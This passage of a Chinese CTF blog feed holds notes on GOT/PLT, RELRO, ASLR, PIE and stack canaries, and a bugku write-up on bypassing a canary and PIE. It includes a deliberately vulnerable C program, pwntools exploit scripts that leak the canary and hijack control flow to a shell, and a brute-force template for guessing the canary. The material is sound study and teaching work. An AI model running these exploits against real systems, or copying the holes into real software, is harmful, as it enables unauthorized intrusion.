class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/wx 0x804a00c</span></span><br><span class="line">0x804a00c:0x08048306</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> si</span></span><br><span class="line">0x08048306 in puts@plt ()</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/2i <span class="variable">$pc</span></span></span><br><span class="line">=&gt; 0x8048306 &lt;puts@plt+6&gt;:push   0x0</span><br><span class="line">   0x804830b &lt;puts@plt+11&gt;:jmp    0x80482f0</span><br></pre></td></tr></table></figure><p>然后线程会进入系统库函数中（libc），并且 .got 记录 libc 地址，.got.plt 记录在 .got 中偏移。</p><h2 id="Pwning-Relocations"><a href="#Pwning-Relocations" class="headerlink" title="Pwning Relocations"></a>Pwning Relocations</h2><p>通常就是控制程序执行流程嘛，但是通常某一部分不会同时开启写和执行权限，也就是 NX 保护嘛。</p><p>然后<code>.got.plt</code>是一个函数指针数组（库），就覆盖其中值控制执行流程。</p><p>对应的保护措施就是 RELRO ：partial and full RELRO。</p><p>Partial RELRO (enabled with <code>-Wl,-z,relro</code>):</p><ul><li>Maps the <code>.got</code> section as read-only (but <em>not</em> <code>.got.plt</code>)</li><li>Rearranges sections to reduce the likelihood of global variables overflowing into control structures.</li></ul><p>Full RELRO (enabled with <code>-Wl,-z,relro,-z,now</code>):</p><ul><li>Does the steps of Partial RELRO, plus:</li><li>Causes the linker to resolve all symbols at link time (before starting execution) and then remove write permissions from <code>.got</code>.</li><li><code>.got.plt</code> is merged into <code>.got</code> with full RELRO, so you won’t see this section name.</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><p><a href="https://bitguard.wordpress.com/2016/11/26/an-example-of-how-procedure-linkage-table-works/"><strong>An example of how Procedure Linkage Table Works</strong></a></p></li><li><p><a href="https://stackoverflow.com/questions/58076539/plt-plt-got-what-is-different"><strong>.plt .plt.got what is different?</strong></a></p></li><li><p><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html"><strong>GOT and PLT for pwning</strong></a> </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> GDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> got </tag>
            
            <tag> plt </tag>
            
            <tag> .got </tag>
            
            <tag> .plt </tag>
            
            <tag> .plt.got </tag>
            
            <tag> .got.plt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASLR与PIE学习笔记</title>
      <link href="archives/9058dffc/"/>
      <url>archives/9058dffc/</url>
      
        <content type="html"><![CDATA[<p>对于 ASLR 和 PIE 一直没有系统归纳，部分概念时常混淆，做个笔记记录一下。</p><h2 id="ASLR-是什么？"><a href="#ASLR-是什么？" class="headerlink" title="ASLR 是什么？"></a>ASLR 是什么？</h2><p><strong>ASLR 是 Linux操作系统的功能选项，作用于程序（ELF）装入内存运行时</strong>。是一种针对缓冲区溢出的安全保护技术，通过对加载地址的随机化，防止攻击者直接定位攻击代码位置，到达阻止溢出攻击的一种技术。</p><h3 id="开启、关闭ASLR"><a href="#开启、关闭ASLR" class="headerlink" title="开启、关闭ASLR"></a>开启、关闭ASLR</h3><p>查看当前系统ASLR的打开情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>ASLR 有三个安全等级：</p><ul><li><strong>0</strong>： ASLR 关闭</li><li><strong>1</strong>：随机化栈基地址（stack）、共享库（.so\libraries）、mmap 基地址</li><li><strong>2</strong>：在<strong>1</strong>基础上，增加随机化堆基地址（chunk）</li></ul><h2 id="PIE-是什么？"><a href="#PIE-是什么？" class="headerlink" title="PIE 是什么？"></a>PIE 是什么？</h2><p><strong>PIE 是 gcc 编译器的功能选项，作用于程序（ELF）编译过程中</strong>。是一个针对代码段（ .text ）、数据段（ .data ）、未初始化全局变量段（ .bss ）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过 ROPgadget 等一些工具来帮助解题。</p><h3 id="开启-PIE"><a href="#开启-PIE" class="headerlink" title="开启 PIE"></a>开启 PIE</h3><p>在使用 gcc 编译时加入参数<code>-fPIE</code>。</p><p>PIE 开启后会随机化代码段（ .text ）、初始化数据段（ .data ）、未初始化数据段（ .bss ）的加载地址。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table><thead><tr><th></th><th align="left">作用位置</th><th>归属</th><th>作用时间</th></tr></thead><tbody><tr><td>ASLR</td><td align="left"><strong>1</strong>：栈基地址（stack）、共享库（.so\libraries）、mmap 基地址<br /><strong>2</strong>：在<strong>1</strong>基础上，增加随机化堆基地址（chunk）</td><td>系统功能</td><td>作用于程序（ELF）装入内存运行时</td></tr><tr><td>PIE</td><td align="left">代码段（ .text ）、初始化数据段（ .data ）、未初始化数据段（ .bss ）</td><td>编译器功能</td><td>作用于程序（ELF）编译过程中</td></tr></tbody></table><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>PIE 绕过题目笔记补充</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.anquanke.com/post/id/177520">【PIE保护详解和常用bypass手段】</a></p><p><a href="https://www.twblogs.net/a/5c23ac5cbd9eee16b4a7c794">【ASLR，PIE，PIC的相似處及區別】</a></p><p><a href="https://blog.51cto.com/duallay/1876841">【ASLR和PIE】</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ASLR </tag>
            
            <tag> PIE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary学习笔记</title>
      <link href="archives/60c4a128/"/>
      <url>archives/60c4a128/</url>
      
        <content type="html"><![CDATA[<h2 id="Canary是什么"><a href="#Canary是什么" class="headerlink" title="Canary是什么"></a><strong>Canary是什么</strong></h2><p>由于栈溢出(stack overflow)而引发的攻击非常普遍也非常古老, 相应地一种叫做canary就出现在gcc/glibc里, 直到现在也作为系统安全的第一道防线存在。</p><p>canary 实现和设计思想都比较简单, 就是插入一个值, 在stack overflow发生的高危区域的栈空间尾部, 当函数返回之时检测canary的值是否经过了改变, 以此来判断stack/buffer overflow是否发生。</p><p>Canary与windows下的GS保护都是防止栈溢出的有效手段，几乎并不消耗系统资源，所以现在成了linux下保护机制的标配。</p><h2 id="在GCC中使用Canary"><a href="#在GCC中使用Canary" class="headerlink" title="在GCC中使用Canary"></a><strong>在GCC中使用Canary</strong></h2><p>在GCC中使用以下参数设置Canary:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure><h2 id="Canary实现原理"><a href="#Canary实现原理" class="headerlink" title="Canary实现原理"></a>Canary实现原理</h2><p>当程序启用Canary编译后，在函数序言部分会取fs寄存器0x28处的值，存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置。 这个操作即为向栈中插入Canary值，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>Canary保护的stack结构大概如下(64位)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp &#x3D;&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 &#x3D;&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定。</p><p>这意味可以通过劫持 <code>__stack_chk_fail</code>的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 。</p><p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;&#x2F; _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  &#x2F;&#x2F; glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  &#x2F;&#x2F; 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard &#x3D; _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random &#x3D; NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><h2 id="Canary绕过技术"><a href="#Canary绕过技术" class="headerlink" title="Canary绕过技术"></a>Canary绕过技术</h2><h3 id="泄露栈中的Canary"><a href="#泄露栈中的Canary" class="headerlink" title="泄露栈中的Canary"></a><strong>泄露栈中的Canary</strong></h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串，简单点说就是正常情况下，不能被 printf 等输出函数输出，防止泄露。 泄露栈中的 Canary 的思路是覆盖 Canary 的最后一个字节”\x00”，来打印出剩余的 Canary 部分。</p><p>这种利用方式需要存在合适的<strong>输出函数</strong>，或者通过<strong>格式化字符串</strong>泄漏。并且可能需要第一次溢出泄露 Canary，之后再次溢出恢复 Canary 最后一位，才能控制执行流程。举个例子来说：想控制 vul() 函数执行流程，需要在 vul() 内溢出两次。</p><p><strong>利用示例</strong></p><p>编译为 32bit 程序，开启 NX，ASLR，Canary 保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ex2.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello Hacker!&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;ex2&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ex2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_shell = ELF(<span class="string">&quot;./ex2&quot;</span>).sym[<span class="string">&quot;getshell&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello Hacker!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak Canary</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">100</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;A&quot;</span>*<span class="number">100</span>)</span><br><span class="line">Canary = u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span></span><br><span class="line">log.info(<span class="string">&quot;Canary:&quot;</span>+<span class="built_in">hex</span>(Canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass Canary</span></span><br><span class="line">payload = <span class="string">&quot;\x90&quot;</span>*<span class="number">100</span>+p32(Canary)+<span class="string">&quot;\x90&quot;</span>*<span class="number">12</span>+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="逐字节爆破Canary"><a href="#逐字节爆破Canary" class="headerlink" title="逐字节爆破Canary"></a>逐字节爆破Canary</h3><p>每次进程重启后的 Canary 不同，但是同一个进程中的不同线程的 Canary 是相同的，并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存，就是子进程会继承父进程的Canary。</p><p>当我们子进程由于Canary判断不正确导致程序crash（崩溃）后，父进程不会Crash。利用这样的特点，彻底逐个字节将Canary爆破出来，爆破模板如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Brute forcing stack canary &quot;</span></span><br><span class="line"></span><br><span class="line">start = <span class="built_in">len</span>(p)</span><br><span class="line">stop = <span class="built_in">len</span>(p)+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(p) &lt; stop:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">      res = send2server(p + <span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> res != <span class="string">&quot;&quot;</span>:</span><br><span class="line">         p = p + <span class="built_in">chr</span>(i)</span><br><span class="line">         <span class="comment">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> i == <span class="number">255</span>:</span><br><span class="line">         <span class="built_in">print</span> <span class="string">&quot;[-] Exploit failed&quot;</span></span><br><span class="line">         sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-<span class="number">1</span>:-<span class="number">1</span>].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary</span><br></pre></td></tr></table></figure><h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p><strong>例题</strong></p><ul><li><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p></li><li><p><a href="https://www.jianshu.com/p/110f715c210f">xman babystack</a></p></li></ul><h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p><strong>例题</strong></p><ul><li>StarCTF2018 babystack</li></ul><h3 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h3><p>这种操作的核心思想就是想办法让他不执行canary的报错或者直接跳过canary的检查。</p><p>利用格式化字符串或者数组下标越界，可以栈地址任意读写，不必<strong>连续</strong>向栈上写，直接写ebp和ret因此不会触发Canary检查。也就是不覆写canary。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><strong>参考资料</strong></h2><p>[1] ctf-wiki.<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/">canary-zh</a></p><p>[2] 23R3F.<a href="https://www.jianshu.com/p/c3624f5dd583">PWN之canary骚操作</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary&amp;PIE绕过 - bugku</title>
      <link href="archives/e0570ac9/"/>
      <url>archives/e0570ac9/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目涉及绕过<strong>canary</strong>、<strong>PIE</strong>保护，未了解两者知识，可到<strong>ctf wiki</strong>学习。</p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>64位保护全开的程序</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191216234355.png"></p><p>IDA打开，main 函数里面调用 vul 后，直接 return 0 退出。</p><p>vul 函数业务流程：读入 fpath 地址，输出 fpath 指向的内容，输入note。分析发现 thinking_note 写入时，大于定义的大小，存在栈溢出可能（程序开了canary保护），溢出点请看图。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191216235440.png"></p><p>write_note 部分(after line 33)处理逻辑有点奇怪：当第一次输入的 note 长度不是624时，要求重新输入一次长度最长为 0x270 的 note。这里可用来读取栈上canary值，而绕过canary保护。</p><h3 id="leak-canary"><a href="#leak-canary" class="headerlink" title="leak canary"></a>leak canary</h3><p>第一次 note 栈溢出覆写 canary 最低位的<code>\00</code>，让 puts 顺利打印出 canary 的值。第二次 note 复原被破坏的 canary 值，并覆写 rip 完成 rop。这里第一次栈溢出不会破坏后面几个函数栈中的canary，因为栈是向低地址增长,后面函数栈在 vul栈 的前面(低地址)，而栈溢出是向高地址覆写。</p><p>首先需要知道 thinking_note 到 canary 的距离。canary 在 rbp 的前面一个内存块中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rip &#x3D;&gt;  | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp &#x3D;&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 &#x3D;&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量         |</span><br><span class="line">  Low     |                 |    </span><br><span class="line">  Addressfrom ctf wiki(经作者部分修改)</span><br></pre></td></tr></table></figure><p>thinking_note 在栈中的相对位置为 rbp-0x260。这里也可以利用IDA查看 vul 的栈结构(双击局部变量，打开stack view)，得出两个距离。var_8 就是 canary 值。s、r 分别是 rbp、rip 的缩写。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191217002256.png"></p><p>至此程序就等于关闭 canary 保护。泄露canary部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> p.recvuntil(&amp;quot;path:&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;flag&amp;quot;)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(&amp;quot;<span class="built_in">len</span>:&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;<span class="number">1000</span>&amp;quot;)<span class="comment">#大于0x258且不等于0x270</span></span><br><span class="line">payload = &amp;quot;A&amp;quot; * (<span class="number">0x260</span>-<span class="number">8</span>)+&amp;quot;B&amp;quot;</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(&amp;quot;B&amp;quot;)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,&amp;quot;\x00&amp;quot;))</span><br><span class="line"><span class="built_in">print</span> &amp;quot;cancay:&amp;quot;, <span class="built_in">hex</span>(canary)</span><br><span class="line">x = p.recvline()</span><br></pre></td></tr></table></figure><h3 id="ret2main"><a href="#ret2main" class="headerlink" title="ret2main"></a>ret2main</h3><p>由于程序开启了 PIE 保护，并不能直接将 rip 覆写为 IDA 显示的 vul 地址。但是 PIE 技术存在缺陷，就是某一条指令的后三位十六进制数的地址是不变的。但是我们也只能覆写最后两位，为什么？</p><p>checksec 的时候看到了程序是：amd64-64-little，采用小端序存储。高字节存在高地址处，然后栈是从高地址向低地址增长的，ret的末两位（低字节）自然存在栈的低地址处，即靠近rbp的那一头，所以覆盖rbp以后的两位就是覆盖了ret的末两位。举个例子?：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IDA、gdb中显示的：   0x0123456789abcdef</span><br><span class="line">实际上在内存中的样子：&lt;&#x3D; low addr     0xefcdab8967452301high addr &#x3D;&gt;</span><br></pre></td></tr></table></figure><p>从例子中可以看到，最后34位是连在一起了，不能单独修改其中的一个。退而求其次，覆写最后两位。ret 的函数可以是 main 或者是 vul 。因为两者地址倒数第三位相同。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191217225325.png"></p><p>ret2main部分代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&amp;quot;(<span class="built_in">len</span> <span class="keyword">is</span> <span class="number">624</span>)\n&amp;quot;)</span><br><span class="line">payload = &amp;quot;A&amp;quot; * (<span class="number">0x260</span>-<span class="number">8</span>) </span><br><span class="line">payload += p64(canary)<span class="comment">#恢复破坏的canary</span></span><br><span class="line">payload += &amp;<span class="comment">#039;a&amp;#039;*0x8#overwrite rbp</span></span><br><span class="line">payload += &amp;quot;\x20&amp;quot;</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h3 id="leak-elf-base-addr"><a href="#leak-elf-base-addr" class="headerlink" title="leak elf_base_addr"></a>leak elf_base_addr</h3><p>拿到程序canary后，就可以顺便把PIE也绕过了，也就是找到程序加载的偏移。在 vul 中栈溢出，打印出 vul ret 值，然后与 0xd2e (call vul 下一行)相减得到偏移值。</p><p>至此题目就是一道普通的ret2libc题目，泄露elf偏移部分代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> p.recvuntil(&amp;quot;path:&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;flag&amp;quot;)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(&amp;quot;<span class="built_in">len</span>:&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;<span class="number">1000</span>&amp;quot;)</span><br><span class="line">payload = &amp;quot;A&amp;quot; * (<span class="number">0x260</span>+<span 